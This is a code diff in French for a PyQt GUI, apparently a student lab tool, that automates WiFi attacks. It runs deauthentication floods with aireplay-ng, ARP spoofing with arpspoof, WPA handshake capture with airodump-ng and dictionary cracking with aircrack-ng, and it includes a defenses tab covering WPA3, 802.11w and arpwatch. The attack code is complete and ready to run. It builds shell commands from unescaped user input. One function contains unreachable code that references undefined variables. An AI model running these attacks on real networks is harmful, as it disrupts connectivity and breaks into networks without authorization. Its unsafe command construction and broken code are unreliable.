+            "CAPFILE=$(ls -t {prefix}_*-01.cap 2>/dev/null | head -1)\n"
+            "if [ -n \"$CAPFILE\" ]; then\n"
+            "  echo '✅ Fichier créé : '$CAPFILE\n"
+            "  PKTS=$(aircrack-ng \"$CAPFILE\" 2>/dev/null | grep -c 'WPA')\n"
+            "  if [ \"$PKTS\" -gt 0 ] 2>/dev/null; then\n"
+            "    echo '✅ Handshake WPA détecté dans le fichier !'\n"
+            "  else\n"
+            "    echo '⚠ Fichier créé mais handshake WPA non confirmé'\n"
+            "    echo '  Essayez : assurez-vous qu un client est connecté'\n"
+            "  fi\n"
+            "  echo '__CAPFILE__'$CAPFILE'__CAPFILE__'\n"
+            "else\n"
+            "  echo '❌ Aucun fichier .cap trouvé'\n"
+            "  echo '   Vérifiez : interface moniteur active, BSSID correct, canal correct'\n"
+            "fi\n"
+        ).format(
+            bssid=bssid,
+            chan=chan,
+            base=base_iface,
+            iface=iface,
+            prefix=cap_prefix,
+        )
+
+        self.btn_cap_auto.setEnabled(False)
+        self.btn_cap_auto.setText("⏳ Capture...")
+        self.di_terminal.clear()
+        self.di_terminal.append(
+            f"<span style='color:{COLORS['warning']};'>"
+            f"⏳ Capture en cours — BSSID:{bssid}  Canal:{chan}  Interface:{iface}</span><br>"
+        )
+
+        cmd = f"bash -c '{script.replace(chr(39), chr(39)+chr(92)+chr(39)+chr(39))}'"
+        # Plus propre : écrire le script dans un fichier temp
+        script_path = "/tmp/_cap_dict.sh"
+        with open(script_path, "w") as f:
+            f.write("#!/bin/bash\n" + script)
+        os.chmod(script_path, 0o755)
+
+        self.thread = CmdThread(f"bash {script_path}")
+        self.thread.output.connect(self._on_dict_cap_output)
+        self.thread.finished.connect(lambda ok, m: (
+            self.btn_cap_auto.setEnabled(True),
+            self.btn_cap_auto.setText("📡 Capturer maintenant")
+        ))
+        self.thread.start()
+
+    def _on_dict_cap_output(self, line):
+        import re as _re
+        m = _re.search(r'__CAPFILE__(.+?)__CAPFILE__', line)
+        if m:
+            cap_path = m.group(1).strip()
+            if cap_path:
+                self.cap_file = cap_path
+                self.di_capfile.setText(cap_path)
+                self.di_terminal.append(
+                    f"<span style='color:{COLORS['success']};'>"
+                    f"✅ Fichier créé et inséré : {cap_path}</span>"
+                )
+        else:
+            self.di_terminal.append(line)
+
+    def _refresh_cap_list(self):
+        """Rafraîchit la liste des fichiers .cap disponibles dans APP_DIR."""
+        import glob as _g
+        caps = sorted(_g.glob(os.path.join(APP_DIR, "handshake_*-01.cap")), reverse=True)
+        if not hasattr(self, 'w_cap_combo'):
+            return
+        current_data = self.w_cap_combo.currentData()
+        self.w_cap_combo.blockSignals(True)
+        self.w_cap_combo.clear()
+        self.w_cap_combo.addItem("— Nouveau fichier (créé automatiquement) —", None)
+        for cap in caps:
+            fname = os.path.basename(cap)
+            self.w_cap_combo.addItem(fname, cap)
+        # Restaurer sélection
+        if current_data:
+            for i in range(self.w_cap_combo.count()):
+                if self.w_cap_combo.itemData(i) == current_data:
+                    self.w_cap_combo.setCurrentIndex(i)
+                    break
+        self.w_cap_combo.blockSignals(False)
+        self.w_cap_combo.setToolTip(
+            f"{len(caps)} fichier(s) .cap dans {APP_DIR}" if caps
+            else f"Aucun fichier .cap dans {APP_DIR}"
+        )
+
+    def show_page(self, idx):
+        self.stack.setCurrentIndex(idx)
+        # Rafraîchir la liste .cap quand on arrive sur la page WPA
+        if idx == 2:
+            self._refresh_cap_list()
+
+    def _update_deauth_preview(self):
+        n = self.d_count.value()
+        cnt = str(n) if n > 0 else "0 (continu)"
+        self.d_cmd_preview.setText(
+            f"sudo aireplay-ng --deauth {cnt} -a {self.d_bssid.text()} "
+            f"-c {self.d_client.text()} {self.d_iface.text()}"
+        )
+
+    def _run_on_current(self, cmd):
+        idx = self.stack.currentIndex()
+        terms = [self.d_terminal, self.a_terminal, self.w_t1, self.di_terminal]
+        terminal = terms[min(idx, len(terms)-1)]
+        terminal.clear()
+        self.thread = CmdThread(cmd)
+        self.thread.output.connect(terminal.append)
+        self.thread.start()
+
+    def stop_attack(self):
+        """Arrête le processus en cours + les 3 threads WPA si actifs."""
+        if self.thread:
+            self.thread.stop()
+        self.stop_wpa()
+
+    def lancer(self):
+        idx = self.stack.currentIndex()
+        if idx == 0:   self.launch_deauth()
+        elif idx == 1: self.launch_arp()
+        elif idx == 2: self.launch_handshake()
+        elif idx == 3: self.launch_dict()
+
+    def _update_dict_preview(self):
+        cap = self.di_capfile.text().strip()
+        wl  = self.di_wordlist.text().strip()
+        b   = self.di_bssid.text().strip()
+        if b and b != "XX:XX:XX:XX:XX:XX":
+            cmd = f"sudo aircrack-ng -b {b} -w {wl} {cap}"
+        else:
+            cmd = f"sudo aircrack-ng -w {wl} {cap}"
+        self.di_cmd_preview.setText(cmd)
+
+    def launch_deauth(self):
+        n = self.d_count.value()
+        cmd = (f"sudo aireplay-ng --deauth {n} "
+               f"-a {self.d_bssid.text()} -c {self.d_client.text()} "
+               f"{self.d_iface.text()}")
+        self._run_on_current(cmd)
+
+    def launch_arp(self):
+        iface  = self.a_iface.text().strip()
+        target = self.a_target.text().strip()
+        router = self.a_router.text().strip()
+        cmd = (f"sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward && "
+               f"arpspoof -i {iface} -t {target} {router}'")
+        self._run_on_current(cmd)
+
+    def launch_handshake(self):
+        iface  = self.w_iface.text().strip()
+        bssid  = self.w_bssid.text().strip()
+        chan   = self.w_channel.text().strip()
+        wl     = self.w_wordlist.text().strip()
+
+        # Client MAC depuis le sélecteur
+        client_mac = "FF:FF:FF:FF:FF:FF"
+        if hasattr(self, 'w_client_combo') and self.w_client_combo.currentData():
+            client_mac = self.w_client_combo.currentData()
+
+        base_iface = iface.replace("mon", "") if iface.endswith("mon") else iface
+        cap_prefix = os.path.join(APP_DIR, "handshake")
+        ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
+        cap_file = f"{cap_prefix}_{ts}"
+        cap_01   = f"{cap_file}-01.cap"
+
+        # Fichier .cap existant sélectionné → crack direct
+        selected_cap = self.w_cap_combo.currentData() if hasattr(self, 'w_cap_combo') else None
+        use_existing = selected_cap and os.path.exists(str(selected_cap))
+
+        self.stop_wpa()
+        self._wpa_threads = []
+        for t in [self.w_t1, self.w_t2, self.w_t3]:
+            t.clear()
+        if hasattr(self, 'w_verif_result'):
+            self.w_verif_result.clear()
+
+        # ──────────────────────────────────────────────────
+        # MODE CRACK DIRECT (fichier .cap existant choisi)
+        # ──────────────────────────────────────────────────
+        if use_existing:
+            cap_01 = selected_cap
+            ac = COLORS['accent']
+            self.w_status.setText(f"⚔ Étapes 5+6 — crack sur {os.path.basename(cap_01)}")
+            self.w_t1.append(
+                f"<span style='color:{ac};'>"
+                f"ℹ Fichier .cap sélectionné :<br>{cap_01}</span>"
+            )
+            self.w_t2.append(
+                f"<span style='color:{ac};'>"
+                f"┌─ ÉTAPE 5 : Vérification handshake<br>"
+                f"│  sudo aircrack-ng {cap_01}</span><br>"
+            )
+            # Vérification
+            self._verify_handshake(cap_01)
+
+            # Crack
+            script6 = (
+                "#!/bin/bash\n"
+                f"echo ''\n"
+                f"echo '┌─ ÉTAPE 6 : Attaque dictionnaire'\n"
+                f"echo '│  sudo aircrack-ng -w {wl} {cap_01}'\n"
+                f"echo '└─────────────────────────────────'\n"
+                f"echo ''\n"
+                f"sudo aircrack-ng -b {bssid} -w {wl} {cap_01}\n"
+                f"echo ''\n"
+                f"echo '  ✅ Crack terminé'\n"
+                f"echo ''\n"
+                f"echo '┌─ ÉTAPE 7 : Désactivation mode moniteur'\n"
+                f"echo '│  sudo airmon-ng stop {base_iface}mon'\n"
+                f"echo '└─────────────────────────────────'\n"
+                f"sudo airmon-ng stop {base_iface}mon 2>/dev/null\n"
+                f"echo '  ✅ Mode moniteur désactivé'\n"
+            )
+            with open("/tmp/wpa_crack.sh", "w") as f: f.write(script6)
+            os.chmod("/tmp/wpa_crack.sh", 0o755)
+            t6 = CmdThread("bash /tmp/wpa_crack.sh")
+            t6.output.connect(self.w_t3.append)
+            t6.start()
+            self._wpa_threads.append(t6)
+            self.di_capfile.setText(cap_01)
+            self.cap_file = cap_01
+            return
+
+        # ──────────────────────────────────────────────────
+        # MODE COMPLET — 7 ÉTAPES
+        # ──────────────────────────────────────────────────
+        self.w_status.setText(
+            f"⏳ 3 processus actifs — BSSID:{bssid}  Canal:{chan}  Client:{client_mac}"
+        )
+
+        # ══════════════════════════════════════════════════
+        # TERMINAL 1 — Étapes 1 + 3 : Mode moniteur + Capture
+        # ══════════════════════════════════════════════════
+        script_t1 = (
+            "#!/bin/bash\n"
+            f"BASE='{base_iface}'\n"
+            f"IFACE='{iface}'\n"
+            f"BSSID='{bssid}'\n"
+            f"CHAN='{chan}'\n"
+            f"OUT='{cap_file}'\n"
+            "\n"
+            "echo ''\n"
+            "echo '══════════════════════════════════════════'\n"
+            "echo ' TERMINAL 1 — CAPTURE HANDSHAKE'\n"
+            "echo '══════════════════════════════════════════'\n"
+            "echo ''\n"
+            "echo '┌─ ÉTAPE 1 : Mode moniteur'\n"
+            f"echo '│  sudo airmon-ng start {base_iface}'\n"
+            "echo '└──────────────────────────────────────'\n"
+            "echo ''\n"
+            # Étape 1 : activer mode moniteur
+            "if iw dev $IFACE info >/dev/null 2>&1; then\n"
+            "  echo '  ✅ Interface '$IFACE' déjà active'\n"
+            "else\n"
+            "  echo '  ⚙  Activation mode moniteur...'\n"
+            "  sudo airmon-ng check kill 2>&1 | grep -v '^$' | head -5\n"
+            "  sudo airmon-ng start $BASE 2>&1 | grep -E 'monitor|enabled|started'\n"
+            "  sleep 2\n"
+            "  if iw dev ${BASE}mon info >/dev/null 2>&1; then\n"
+            "    IFACE=${BASE}mon\n"
+            "    echo '  ✅ Interface moniteur créée : '$IFACE\n"
+            "  else\n"
+            "    sudo iw dev $BASE interface add mon0 type monitor 2>/dev/null\n"
+            "    sudo ip link set mon0 up\n"
+            "    IFACE=mon0\n"
+            "    echo '  ✅ Interface moniteur créée : '$IFACE\n"
+            "  fi\n"
+            "fi\n"
+            "echo ''\n"
+            "echo '┌─ ÉTAPE 3 : Capture handshake'\n"
+            f"echo '│  sudo airodump-ng -c {chan} --bssid {bssid} -w {cap_file} $IFACE'\n"
+            "echo '└──────────────────────────────────────'\n"
+            "echo ''\n"
+            "echo '  BSSID  : '$BSSID\n"
+            "echo '  Canal  : '$CHAN\n"
+            "echo '  Sortie : '$OUT'-01.cap'\n"
+            "echo ''\n"
+            "echo '  ⏳ Capture — attendez : [WPA handshake: '$BSSID']'\n"
+            "echo ''\n"
+            "sudo airodump-ng -c $CHAN --bssid $BSSID -w $OUT --output-format cap $IFACE\n"
+            "echo ''\n"
+            "echo '  ✅ Capture terminée → '$OUT'-01.cap'\n"
+        )
+
+        # ══════════════════════════════════════════════════
+        # TERMINAL 2 — Étapes 4 + 5 : Deauth + Vérification (boucle)
+        # ══════════════════════════════════════════════════
+        script_t2 = (
+            "#!/bin/bash\n"
+            f"BSSID='{bssid}'\n"
+            f"CLIENT='{client_mac}'\n"
+            f"IFACE='{iface}'\n"
+            f"CAP='{cap_01}'\n"
+            f"PREFIX='{cap_prefix}'\n"
+            "\n"
+            "echo ''\n"
+            "echo '══════════════════════════════════════════'\n"
+            "echo ' TERMINAL 2 — DEAUTH + VÉRIFICATION'\n"
+            "echo '══════════════════════════════════════════'\n"
+            "echo ''\n"
+            "echo '  ⏳ Attente 5s que la capture démarre...'\n"
+            "sleep 5\n"
+            "if ! iw dev $IFACE info >/dev/null 2>&1; then\n"
+            f"  if iw dev {base_iface}mon info >/dev/null 2>&1; then\n"
+            f"    IFACE={base_iface}mon\n"
+            "  else IFACE=mon0; fi\n"
+            "fi\n"
+            "echo ''\n"
+            "echo '┌─ ÉTAPE 4 : Déconnexion clients (force handshake)'\n"
+            "echo '│  sudo aireplay-ng -0 15 -a '$BSSID' -c '$CLIENT' '$IFACE\n"
+            "echo '└──────────────────────────────────────'\n"
+            "echo ''\n"
+            "echo '  BSSID réseau : '$BSSID\n"
+            "echo '  Client MAC   : '$CLIENT' (FF:FF = tous)'\n"
+            "echo '  Interface    : '$IFACE\n"
+            "echo ''\n"
+            "echo '  💥 Envoi 15 paquets deauth — clients forcés à se reconnecter'\n"
+            "sudo aireplay-ng -0 15 -a $BSSID -c $CLIENT $IFACE\n"
+            "echo ''\n"
+            "echo '  💥 2ème vague deauth (20 paquets)...'\n"
+            "sudo aireplay-ng -0 20 -a $BSSID -c $CLIENT $IFACE\n"
+            "echo ''\n"
+            "echo '  ✅ Deauth terminé'\n"
+            "echo ''\n"
+            # Boucle étape 5 : vérifier handshake, retry si 0
+            "RETRY=0\n"
+            "MAX_RETRY=5\n"
+            "while [ $RETRY -lt $MAX_RETRY ]; do\n"
+            "  echo '┌─ ÉTAPE 5 : Vérification handshake (tentative '$((RETRY+1))')'\n"
+            "  echo '│  sudo aircrack-ng '$CAP\n"
+            "  echo '└──────────────────────────────────────'\n"
+            "  echo ''\n"
+            "  sleep 3\n"
+            "  CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
+            "  [ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
+            "  echo '  Fichier : '$CAPFILE\n"
+            "  if [ ! -f \"$CAPFILE\" ]; then\n"
+            "    echo '  ⏳ Fichier pas encore créé...'\n"
+            "    sleep 5; RETRY=$((RETRY+1)); continue\n"
+            "  fi\n"
+            "  echo ''\n"
+            "  RESULT=$(sudo aircrack-ng \"$CAPFILE\" 2>&1)\n"
+            "  echo \"$RESULT\" | grep -E '#|BSSID|WPA|WEP|handshake|ESSID' | head -8\n"
+            "  echo ''\n"
+            "  HS=$(echo \"$RESULT\" | grep -c 'WPA (1 handshake)\\|WPA (2 handshake)\\|WPA ([1-9]')\n"
+            "  if [ \"$HS\" -gt 0 ]; then\n"
+            "    echo '  ✅ HANDSHAKE WPA CAPTURÉ ! → Crack lancé dans Terminal 3'\n"
+            "    echo '__VERIF__'\"$(echo \"$RESULT\" | grep -E 'WPA|BSSID|ESSID' | head -5)\"'__VERIF__'\n"
+            "    break\n"
+            "  else\n"
+            "    echo '  ⚠  WPA (0 handshake) — Relance deauth...'\n"
+            "    echo '__VERIF_FAIL__'\n"
+            "    sudo aireplay-ng -0 20 -a $BSSID -c $CLIENT $IFACE\n"
+            "    RETRY=$((RETRY+1))\n"
+            "  fi\n"
+            "done\n"
+            "if [ $RETRY -ge $MAX_RETRY ]; then\n"
+            "  echo '  ❌ Handshake non capturé après $MAX_RETRY tentatives'\n"
+            "  echo '  → Vérifiez : client connecté ? canal correct ? interface OK ?'\n"
+            "fi\n"
+        )
+
+        # ══════════════════════════════════════════════════
+        # TERMINAL 3 — Étapes 6 + 7 : Crack + Stop moniteur
+        # ══════════════════════════════════════════════════
+        script_t3 = (
+            "#!/bin/bash\n"
+            f"BSSID='{bssid}'\n"
+            f"CAP='{cap_01}'\n"
+            f"WL='{wl}'\n"
+            f"PREFIX='{cap_prefix}'\n"
+            f"BASE='{base_iface}'\n"
+            "\n"
+            "echo ''\n"
+            "echo '══════════════════════════════════════════'\n"
+            "echo ' TERMINAL 3 — CRACK DICTIONNAIRE'\n"
+            "echo '══════════════════════════════════════════'\n"
+            "echo ''\n"
+            "echo '  BSSID   : '$BSSID\n"
+            "echo '  Wordlist: '$WL\n"
+            "echo ''\n"
+            "echo '  ⏳ Attente que le handshake soit capturé (25s)...'\n"
+            "sleep 25\n"
+            "echo ''\n"
+            # Chercher le fichier le plus récent
+            "CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
+            "[ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
+            "echo '  🗃  Fichier utilisé : '$CAPFILE\n"
+            "echo ''\n"
+            # Attendre si fichier absent
+            "if [ ! -f \"$CAPFILE\" ]; then\n"
+            "  echo '  ⏳ Fichier absent, attente 20s...'\n"
+            "  sleep 20\n"
+            "  CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
+            "  [ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
+            "fi\n"
+            "echo '┌─ ÉTAPE 6 : Attaque dictionnaire'\n"
+            f"echo '│  sudo aircrack-ng -w {wl} '$CAPFILE\n"
+            "echo '└──────────────────────────────────────'\n"
+            "echo ''\n"
+            "sudo aircrack-ng -b $BSSID -w $WL \"$CAPFILE\"\n"
+            "echo ''\n"
+            "echo '┌─ ÉTAPE 7 : Désactivation mode moniteur'\n"
+            f"echo '│  sudo airmon-ng stop {base_iface}mon'\n"
+            "echo '└──────────────────────────────────────'\n"
+            "echo ''\n"
+            f"sudo airmon-ng stop {base_iface}mon 2>/dev/null\n"
+            "sudo airmon-ng stop mon0 2>/dev/null\n"
+            "echo '  ✅ Mode moniteur désactivé — wlan0 restauré'\n"
+        )
+
+        # Écrire et lancer les 3 scripts
+        scripts = [
+            ("/tmp/wpa_t1.sh", script_t1, self.w_t1),
+            ("/tmp/wpa_t2.sh", script_t2, self.w_t2),
+            ("/tmp/wpa_t3.sh", script_t3, self.w_t3),
+        ]
+        for path, content, _ in scripts:
+            with open(path, "w") as f: f.write(content)
+            os.chmod(path, 0o755)
+
+        for path, _, terminal in scripts:
+            t = CmdThread(f"bash {path}")
+            t.output.connect(
+                lambda line, term=terminal: self._wpa_line(line, term)
+            )
+            t.start()
+            self._wpa_threads.append(t)
+
+        self.di_capfile.setText(cap_01)
+        self.cap_file = cap_01
+
+    def _wpa_line(self, line, terminal):
+        import re as _re
+        # Marqueur succès vérification
+        m = _re.search(r'__VERIF__(.*)__VERIF__', line)
+        if m:
+            verif = m.group(1).strip()
+            if hasattr(self, 'w_verif_result') and verif:
+                self.w_verif_result.setPlainText(verif)
+                self.w_verif_result.setStyleSheet(
+                    "background:#0d1117; color:#3fb950; "
+                    "font-family:Consolas,monospace; font-size:11px; border:none;"
+                )
+            return
+        # Marqueur échec vérification
+        if '__VERIF_FAIL__' in line:
+            if hasattr(self, 'w_verif_result'):
+                self.w_verif_result.setPlainText(
+                    "⚠ WPA (0 handshake) — Deauth relancé, tentative suivante..."
+                )
+                self.w_verif_result.setStyleSheet(
+                    "background:#0d1117; color:#f59e0b; "
+                    "font-family:Consolas,monospace; font-size:11px; border:none;"
+                )
+            return
+        terminal.append(line)
+
+    def _verify_handshake(self, cap_path):
+        """Vérifie le handshake d'un .cap existant et affiche dans la boîte."""
+        def _run_verify():
+            try:
+                r = subprocess.run(
+                    f"sudo aircrack-ng '{cap_path}' 2>&1",
+                    shell=True, capture_output=True, text=True
+                )
+                out = r.stdout + r.stderr
+                lines = [l for l in out.splitlines()
+                         if any(k in l for k in ['WPA', 'WEP', 'BSSID', 'handshake', '#'])]
+                result = "\n".join(lines[:8]) if lines else "⚠ Aucun handshake détecté"
+                if hasattr(self, 'w_verif_result'):
+                    self.w_verif_result.setPlainText(result)
+            except Exception as e:
+                if hasattr(self, 'w_verif_result'):
+                    self.w_verif_result.setPlainText(f"Erreur : {e}")
+
+        import threading
+        threading.Thread(target=_run_verify, daemon=True).start()
+
+    def _build_crack_script(self, bssid, cap_01, wl):
+        return (
+            "#!/bin/bash\n"
+            f"echo '=== CRACK DIRECT — FICHIER EXISTANT ==='\n"
+            f"echo 'BSSID   : {bssid}'\n"
+            f"echo 'Fichier : {cap_01}'\n"
+            f"echo 'Wordlist: {wl}'\n"
+            "echo ''\n"
+            f"echo '⚔ Attaque dictionnaire...'\n"
+            "echo ''\n"
+            f"sudo aircrack-ng -b {bssid} -w {wl} '{cap_01}'\n"
+            "echo ''\n"
+            "echo '✅ Crack terminé'\n"
+        )
+
+        # ── Script 1 : Activer moniteur + capture ──
+        script_cap = (
+            "#!/bin/bash\n"
+            f"BSSID='{bssid}'\nCHAN='{chan}'\nBASE='{base_iface}'\n"
+            f"IFACE='{iface}'\nOUT='{cap_file}'\n\n"
+            "echo '=== CAPTURE HANDSHAKE ==='\n"
+            "echo 'BSSID  : '$BSSID\n"
+            "echo 'Canal  : '$CHAN\n"
+            "echo 'Fichier: '$OUT'-01.cap'\n"
+            "echo ''\n"
+            "if ! iw dev $IFACE info >/dev/null 2>&1; then\n"
+            "  echo '⚙ Activation moniteur sur '$BASE'...'\n"
+            "  sudo iw dev $BASE interface add mon0 type monitor 2>/dev/null\n"
+            "  sudo ip link set mon0 up 2>/dev/null\n"
+            "  IFACE=mon0\n"
+            "  sleep 2\n"
+            "fi\n"
+            "echo '📡 Interface : '$IFACE\n"
+            "echo '⏳ Capture — attendez [WPA handshake: ...]'\n"
+            "echo ''\n"
+            "sudo airodump-ng -c $CHAN --bssid $BSSID -w $OUT --output-format cap $IFACE\n"
+            "echo ''\n"
+            "echo '✅ Capture terminée'\n"
+        )
+
+        # ── Script 2 : Deauth continu ──
+        script_deauth = (
+            "#!/bin/bash\n"
+            f"BSSID='{bssid}'\nIFACE='{iface}'\n\n"
+            "echo '=== DEAUTH — FORCE RECONNEXION ==='\n"
+            "echo 'BSSID : '$BSSID\n"
+            "echo ''\n"
+            "echo '⏳ Attente 5s que la capture démarre...'\n"
+            "sleep 5\n"
+            "if ! iw dev $IFACE info >/dev/null 2>&1; then IFACE=mon0; fi\n"
+            "echo '💥 Envoi paquets deauth (0=continu) sur '$IFACE'...'\n"
+            "echo '   Les clients vont se déconnecter et reconnecter'\n"
+            "echo '   → Le handshake sera capturé dans le Terminal 1'\n"
+            "echo ''\n"
+            "sudo aireplay-ng --deauth 0 -a $BSSID $IFACE\n"
+        )
+
+        # ── Script 3 : Crack avec aircrack-ng ──
+        script_crack = (
+            "#!/bin/bash\n"
+            f"BSSID='{bssid}'\nCAP='{cap_01}'\n"
+            f"WL='{wl}'\nPREFIX='{cap_prefix}'\n\n"
+            "echo '=== CRACK WPA2 DICTIONNAIRE ==='\n"
+            "echo 'BSSID   : '$BSSID\n"
+            "echo 'Wordlist: '$WL\n"
+            "echo ''\n"
+            "echo '⏳ Attente 20s que le handshake soit capturé...'\n"
+            "sleep 20\n"
+            "echo ''\n"
+            "CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
+            "[ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
+            "echo '🗃 Fichier : '$CAPFILE\n"
+            "echo ''\n"
+            "if [ ! -f \"$CAPFILE\" ]; then\n"
+            "  echo '⏳ Fichier absent, nouvelle attente 15s...'\n"
+            "  sleep 15\n"
+            "  CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
+            "  [ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
+            "fi\n"
+            "echo '⚔ Attaque dictionnaire...'\n"
+            "echo ''\n"
+            "sudo aircrack-ng -b $BSSID -w $WL \"$CAPFILE\"\n"
+            "echo ''\n"
+            "echo '✅ Crack terminé'\n"
+        )
+
+        # Écrire les scripts
+        scripts = [
+            ("/tmp/wpa_cap.sh",   script_cap),
+            ("/tmp/wpa_deauth.sh", script_deauth),
+            ("/tmp/wpa_crack.sh",  script_crack),
+        ]
+        for path, content in scripts:
+            with open(path, "w") as f: f.write(content)
+            os.chmod(path, 0o755)
+
+        # Lancer les 3 CmdThread sur les 3 terminaux internes
+        terminals = [self.w_t1, self.w_t2, self.w_t3]
+        for i, (path, _) in enumerate(scripts):
+            t = CmdThread(f"bash {path}")
+            t.output.connect(terminals[i].append)
+            t.finished.connect(lambda ok, m, term=terminals[i], idx=i:
+                term.append(
+                    f"<span style='color:{COLORS['success'] if ok else COLORS['danger']};'>"
+                    f"{'✅ Terminé' if ok else '❌ Arrêté'}</span>"
+                )
+            )
+            t.start()
+            self._wpa_threads.append(t)
+
+        # Mettre à jour le champ dictionnaire
+        self.di_capfile.setText(cap_01)
+        self.cap_file = cap_01
+
+    def stop_wpa(self):
+        """Arrête proprement les 3 processus WPA."""
+        for t in getattr(self, '_wpa_threads', []):
+            try:
+                t.stop()
+            except Exception:
+                pass
+        self._wpa_threads = []
+        if hasattr(self, 'w_status'):
+            self.w_status.setText("⏹ Processus arrêtés")
+
+    def _on_handshake_output(self, line):
+        import re as _re
+        m = _re.search(r'__CAPFILE__(.+?)__CAPFILE__', line)
+        if m:
+            cap_path = m.group(1).strip()
+            if cap_path:
+                self.cap_file = cap_path
+                self.di_capfile.setText(cap_path)
+                self.w_t1.append(
+                    f"<span style='color:{COLORS['success']};'>"
+                    f"✅ Handshake capturé : {cap_path}<br>"
+                    f"→ Champ Dictionnaire mis à jour.</span>"
+                )
+        else:
+            self.w_t1.append(line)
+
+    def launch_crack(self):
+        cap   = getattr(self, 'cap_file', DEFAULT_CAP)
+        wl    = self.w_wordlist.text().strip()
+        bssid = self.w_bssid.text().strip()
+        cmd   = f"sudo aircrack-ng -b {bssid} -w {wl} {cap}"
+        self._run_on_current(cmd)
+
+    def launch_dict(self):
+        import glob as _glob
+
+        cap   = self.di_capfile.text().strip()
+        wl    = self.di_wordlist.text().strip()
+        bssid = self.di_bssid.text().strip()
+        ssid  = self.di_ssid.text().strip()
+
+        # Si le fichier n'existe pas → chercher le plus récent automatiquement
+        if not cap or not os.path.exists(cap):
+            caps = sorted(
+                _glob.glob(os.path.join(APP_DIR, "handshake_*-01.cap")),
+                reverse=True
+            )
+            if caps:
+                cap = caps[0]
+                self.di_capfile.setText(cap)
+                self.di_terminal.append(
+                    f"<span style='color:{COLORS['warning']};'>"
+                    f"ℹ Fichier auto-détecté : {cap}</span><br>"
+                )
+            else:
+                self.di_terminal.clear()
+                self.di_terminal.append(
+                    f"<span style='color:{COLORS['danger']};'>"
+                    f"❌ Aucun fichier .cap trouvé dans {APP_DIR}<br>"
+                    f"→ Cliquez 📡 <b>Capturer maintenant</b> pour en créer un.</span>"
+                )
+                return
+
+        # Construire la commande aircrack-ng — sans -e pour éviter "No matching network"
+        cmd = f"sudo aircrack-ng -w {wl}"
+        if bssid and bssid != "XX:XX:XX:XX:XX:XX":
+            cmd += f" -b {bssid}"
+        # Ne pas ajouter -e : le filtre SSID peut bloquer si nom ne correspond pas exactement
+        cmd += f" {cap}"
+
+        self.di_terminal.clear()
+        self.di_terminal.append(
+            f"<span style='color:{COLORS['warning']};'>"
+            f"⚔ Attaque dictionnaire lancée...<br>"
+            f"Wordlist : {wl}<br>"
+            f"Fichier  : {cap}</span><br>"
+        )
+        self._run_on_current(cmd)
+
+
+# ==================== ONGLET DÉFENSES ====================
+class TabDefenses(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.thread = None
+        self._build()
+
+    def _build(self):
+        lay = QVBoxLayout(self)
+        lay.setContentsMargins(10, 10, 10, 10)
+
+        hdr = QLabel("CONTRE-MESURES ET DÉFENSES WIFI")
+        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['success']};")
+        lay.addWidget(hdr)
+
+        desc = QLabel(
+            "Créer un point d'accès sécurisé avec WPA2 ou WPA3 + 802.11w\n"
+            "802.11w (MFP = Management Frame Protection) bloque les attaques Deauth.\n"
+            "WPA3 utilise SAE (Simultaneous Auth of Equals) — résistant au crack offline."
+        )
+        desc.setStyleSheet("color:#888; font-size:11px;")
+        desc.setWordWrap(True)
+        lay.addWidget(desc)
+
+        self.stack = QStackedWidget()
+
+        # ── Page 0 : AP WPA2/WPA3 ──
+        ap_w = QWidget()
+        ap_lay = QVBoxLayout(ap_w)
+        ap_cfg = QGroupBox("Configuration AP sécurisé")
+        ap_form = QFormLayout(ap_cfg)
+        self.ap_iface = QLineEdit("wlan0")
+        self.ap_ssid  = QLineEdit("Groupe7_Secure")
+        self.ap_pass  = QLineEdit("MotDePasseTresLong2026!")
+        self.ap_mode  = QComboBox()
+        self.ap_mode.addItems(["WPA2 (AES/CCMP)", "WPA3 (SAE)", "WPA2+WPA3 (Transition)"])
+        self.ap_mfp   = QCheckBox("Activer 802.11w (MFP) — bloque Deauth")
+        self.ap_mfp.setChecked(True)
+        self.ap_chan  = QLineEdit("6")
+        ap_form.addRow("Interface :", self.ap_iface)
+        ap_form.addRow("SSID :", self.ap_ssid)
+        ap_form.addRow("Mot de passe :", self.ap_pass)
+        ap_form.addRow("Mode sécurité :", self.ap_mode)
+        ap_form.addRow("", self.ap_mfp)
+        ap_form.addRow("Canal :", self.ap_chan)
+        ap_lay.addWidget(ap_cfg)
+        self.ap_terminal = QTextEdit(); self.ap_terminal.setReadOnly(True)
+        ap_lay.addWidget(self.ap_terminal, stretch=1)
+        self.stack.addWidget(ap_w)
+
+        # ── Page 1 : arpwatch ──
+        arp_w = QWidget()
+        aw_lay = QVBoxLayout(arp_w)
+        aw_desc = QLabel(
+            "arpwatch — Surveillance des tables ARP\n"
+            "Détecte les changements d'adresses MAC/IP anormaux (ARP Poisoning).\n"
+            "Génère des alertes en temps réel quand une attaque MiM est détectée."
+        )
+        aw_desc.setWordWrap(True)
+        aw_desc.setStyleSheet("color:#888; font-size:11px;")
+        aw_lay.addWidget(aw_desc)
+        aw_cfg = QGroupBox("Configuration arpwatch")
+        aw_form = QFormLayout(aw_cfg)
+        self.aw_iface = QLineEdit("wlan0")
+        aw_form.addRow("Interface à surveiller :", self.aw_iface)
+        aw_lay.addWidget(aw_cfg)
+        self.aw_terminal = QTextEdit(); self.aw_terminal.setReadOnly(True)
+        aw_lay.addWidget(self.aw_terminal, stretch=1)
+        self.stack.addWidget(arp_w)
+
+        # ── Page 2 : tshark ──
+        ws_w = QWidget()
+        ws_lay = QVBoxLayout(ws_w)
+        ws_desc = QLabel(
+            "Wireshark / tshark — Analyse du trafic réseau\n"
+            "Capture et analyse les paquets pour observer le trafic avant/après chiffrement.\n"
+            "But : visualiser les données interceptées et l'effet du chiffrement WPA2/WPA3."
+        )
